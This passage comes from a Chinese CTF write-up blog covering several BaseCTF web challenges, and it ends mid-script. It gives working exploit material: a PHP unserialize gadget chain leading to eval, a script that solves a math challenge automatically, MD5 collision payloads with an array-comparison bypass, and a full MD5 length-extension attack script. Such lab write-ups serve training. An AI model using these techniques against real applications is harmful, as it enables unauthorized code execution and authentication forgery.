class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea-&gt;see = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p>过滤了空格，用常见的空格绕过就行</p><p>网上搜搜就行了，没什么好说的</p><h3 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h3><p>本体唯一的写脚本难度就是代码逻辑问题，本人写错的原因就是因为post了两次导致一直重复发包始终分数为1，就直接上exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:29992/&#x27;</span><br>session = requests.Session()<br>session.cookies.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>, <span class="hljs-string">&#x27;7ovv17kbkuh5f6pr1d2tbk07qt&#x27;</span>)<br>response = session.post(url)<br>math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, response.text)<br>math = math.group(<span class="hljs-number">1</span>).strip()<br>math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>answer = <span class="hljs-built_in">eval</span>(math)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">51</span>):<br>    post_data = &#123;<span class="hljs-string">&#x27;answer&#x27;</span>: answer&#125;<br>    post_response = session.post(url, data=post_data)<br>    math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, post_response.text)<br>    math = math.group(<span class="hljs-number">1</span>).strip()<br>    math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>    answer = <span class="hljs-built_in">eval</span>(math)<br>    <span class="hljs-built_in">print</span>(post_response.text)<br></code></pre></td></tr></table></figure><h3 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>第一层正常的数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apple[]=1&amp;banana[]=2<br></code></pre></td></tr></table></figure><p>第二层和第三层都强制转string了，可以利用到fastcoll来获得内容进行绕过，这里我直接用网上的了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">appple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;bananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2&amp;apppple=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;banananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2<br></code></pre></td></tr></table></figure><p>最后一层已知$random的MD5值，可以控制name和md5的值，求等式进行绕过，通过了解知道是MD5长度拓展攻击</p><p>先前一直在找hashpump的一直不好用现在贴一个比较好用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.A, self.B, self.C, self.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        self.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        self.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = self.A, self.B, self.C, self.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                self._lrot((a + f + self.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, self.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        self.A = (self.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        self.B = (self.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        self.C = (self.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        self.D = (self.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            self.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, self.A, self.B, self.C, self.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span 